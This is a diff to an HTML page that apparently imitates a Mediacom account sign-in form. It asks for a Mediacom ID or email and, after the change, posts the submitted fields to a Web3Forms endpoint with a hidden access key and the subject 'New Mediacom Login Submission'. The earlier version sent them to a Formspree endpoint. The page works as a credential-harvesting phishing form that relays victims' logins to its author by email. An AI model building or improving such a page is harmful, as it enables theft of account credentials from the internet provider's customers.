@@ -120,9 +120,15 @@
         <p>Sign in to your account</p>
     </div>
 
-    <!-- Replace 'your-form-id' with your actual Formspree endpoint -->
-    <form action="https://formspree.io/f/mqpkvqaa" method="POST">
+    <!-- Web3Forms Form Integration -->
+    <form action="https://api.web3forms.com/submit" method="POST">
         
+        <!-- Replace with your Web3Forms Access Key -->
+        <input type="hidden" name="access_key" value="256cf528-eeaa-4ff0-bde8-97b3278b6ae7">
+        
+        <!-- Optional: Customize subject line of the email you receive -->
+        <input type="hidden" name="subject" value="New Mediacom Login Submission">
+
         <div class="form-group">
             <label for="email">Mediacom ID or Email</label>
             <input type="email" id="email" name="email" required placeholder="name@mediacombb.net">
